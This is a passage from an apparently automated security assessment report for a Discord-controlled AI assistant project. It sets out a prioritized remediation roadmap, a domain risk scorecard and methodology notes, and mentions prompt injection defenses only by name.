| 4 | **Restrict file permissions**: `chmod 600` on all `.env`, `.jsonl`, and `.db` files; `chmod 700` on `.agent/` directory | SA-001, SA-002, CSO-002, CSO-006 |
| 5 | **Audit Anthropic API usage logs** for unauthorized inference calls | CSO-001 |
| 6 | ~~**Delete or fix `isMessageAuthorized`** stub function~~ **DONE** | SA-009, STA-001, CSO-004 |

### SHORT-TERM (30 Days) - Architectural Risk Reduction

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| 7 | Add secret-scrubbing filter to `capture-all-events.ts` hook pipeline | SA-002 |
| 8 | Fix voice server CORS to use explicit allowlist + bind to `127.0.0.1` | SA-003, CSO-010 |
| 9 | ~~Implement prompt injection defense layer (XML delimiters, detection, length cap)~~ **DONE** | SA-004, STA-002, CSO-003 |
| 10 | ~~Add subprocess depth counter and resource limits~~ **DONE** | SA-005 |
| 11 | ~~Replace raw error forwarding to Discord with generic messages~~ **DONE** | SA-014, STA-003 |
| 12 | ~~Extend security validator timeout to 500ms, change to fail-closed~~ **DONE** | STA-009, CSO-005 |
| 13 | ~~Expand security hook patterns for Discord-specific attacks~~ **DONE** | STA-015 |
| 14 | ~~Implement per-user message rate limiting (max 5 msgs/60 sec)~~ **DONE** | STA-008 |
| 15 | Replace router and integration tests with real function coverage | STA-006, STA-007 |
| 16 | ~~Pin all dependencies to exact versions, enable `--frozen-lockfile`~~ **DONE** | SA-013, CSO-008 |
| 17 | ~~Add `path.resolve()` + allowlist check for `PAI_DIR` on startup~~ **DONE** | STA-004 |

### MEDIUM-TERM (60 Days) - Security Program Maturation

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| 18 | Add automated secret scanning to pre-commit hooks (gitleaks/detect-secrets) | SA-001, SA-002 |
| 19 | Implement log rotation and 90-day retention policy | CSO-009 |
| 20 | ~~Escape LIKE wildcards in SQLite fallback search~~ **DONE** | SA-006, STA-011 |
| 21 | ~~Move temp files to private directory with `0700` permissions~~ **DONE** | SA-008 |
| 22 | ~~Add path-boundary validation to `cleanupTempFile`~~ **DONE** (STA-013 transcription path still open) | STA-005, STA-013 |
| 23 | ~~Apply `sanitizeContext` to observability log previews~~ **DONE** | STA-010 |
| 24 | Pseudonymize Discord user IDs in observability events | CSO-009 |
| 25 | Add shared secret auth between voice server and TTS sidecar | SA-007 |
| 26 | ~~Refactor `config.ts` to export factory function (no `process.exit` at import)~~ **DONE** | STA-014 |
| 27 | Add concurrent message processing tests | STA-012 |
| 28 | Add session cleanup timer to `index.ts` | SA-010 |

### LONG-TERM (90 Days) - Enterprise Security Posture

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| 29 | Implement secrets management solution (Vault, keychain, or GPG-encrypted store) | CSO-001, CSO-002 |
| 30 | Evaluate container isolation (Docker/Podman) for Discord service subprocess | CSO-003, SA-005 |
| 31 | Develop Incident Response runbook for PAI architecture | CSO-001 |
| 32 | Create threat model document for Discord-to-Claude attack surface | CSO-003 |
| 33 | Establish quarterly dependency audit cadence | CSO-008 |
| 34 | Create security architecture review process for new skills | All |
| 35 | Implement structured security alerting (failed auth, unusual API usage, hook blocks) | CSO-005 |

---

## DOMAIN SCORECARD

| Domain | Rating | Key Gap |
|---|---|---|
| Credential Management | **CRITICAL** | Active exposure in git history and world-readable files |
| Access Control | **GOOD** | Auth stub removed; inline allowlist + rate limiting |
| Input Validation | **GOOD** | 10 prompt injection patterns, 4000 char cap, LIKE escaping |
| Subprocess Security | **GOOD** | Read-only tool sandbox, depth limit, env sanitization |
| Test Quality | **HIGH** | Router/integration tests assert on local constants only |
| Supply Chain | **GOOD** | Dependencies pinned, groq-sdk removed |
| Data Protection | **MEDIUM** | Plaintext logs with secrets, no retention policy |
| Observability | **GOOD** | Events captured; captures secrets; no alerting layer |
| Network Security | **GOOD** | Local services only; CORS misconfigured |
| Secure Coding | **GOOD** | Parameterized queries, typed interfaces, input sanitization |

---

## METHODOLOGY NOTES

- **Scope:** Full SAM project at `/Projects/sam/` including discord-remote-control service, voice server, hooks, skills, observability, and infrastructure
- **Tools:** Static code analysis, live CORS testing, credential pattern scanning, git history review, file permission audit
- **Limitations:** No dynamic application testing (DAST), no network scanning, no fuzzing. Findings based on code review and static analysis only.
- **Confidence:** HIGH - All findings verified against actual source code and file system state

---

*Report generated by jagents_workflow_enterprise_security_assessment*
*Assessment date: 2026-03-06*
